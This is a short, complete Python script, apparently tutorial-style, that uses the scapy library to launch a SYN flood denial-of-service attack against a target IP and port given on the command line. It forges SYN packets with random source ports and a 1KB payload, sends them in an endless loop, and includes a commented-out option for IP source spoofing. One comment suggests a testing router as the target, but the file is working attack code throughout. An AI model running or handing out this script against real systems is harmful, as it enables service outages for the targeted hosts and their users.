from scapy.all import *
import argparse

parser = argparse.ArgumentParser(description="Simple SYN Flood Script")
parser.add_argument("target_ip", help="Target IP address (e.g router's IP)")
parser.add_argument("-p", "--port", type=int, help="Destination port (the port of the target's machine service, \
e.g 80 for HTTP, 22 for SSH and so on).")
# parse arguments from the command line
args = parser.parse_args()
# target IP address (should be a testing router/firewall)
target_ip = args.target_ip
# the target port u want to flood
target_port = args.port
# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)
# or if you want to perform IP Spoofing (will work as well)
# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
# add some flooding data (1KB in this case, don't increase it too much, 
# otherwise, it won't work.)
raw = Raw(b"X"*1024)
# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected 
send(p, loop=1, verbose=0)